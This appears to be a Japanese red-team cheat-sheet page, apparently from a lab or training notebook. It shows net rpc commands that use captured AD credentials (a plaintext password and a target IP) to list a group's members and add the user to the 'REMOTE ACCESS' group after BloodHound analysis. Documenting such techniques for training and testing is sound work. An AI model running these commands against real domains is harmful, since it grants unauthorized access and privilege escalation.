---
title: net rpc
parent: Pivot
grand_parent: Red Team
---

# Kaliから入手したユーザのクレデンシャルを用いてADへの操作を行う
bloodhoundにてユーザがグループへの権限を有していることを確認
![[Pasted image 20260502094043.png]]
## 現メンバーの確認
```zsh
net rpc group members "REMOTE ACCESS" -U "DOMAIN"/"TRACY.WHITE"%"zqwj041FGX" -S "192.168.145.30"
```
![[Pasted image 20260502094048.png]]
## グループへの追加
```zsh
net rpc group addmem "REMOTE ACCESS" "TRACY.WHITE" -U "DOMAIN"/"TRACY.WHITE"%"zqwj041FGX" -S "192.168.145.30"
```
![[Pasted image 20260502094054.png]]

# 再確認
![[Pasted image 20260502094102.png]]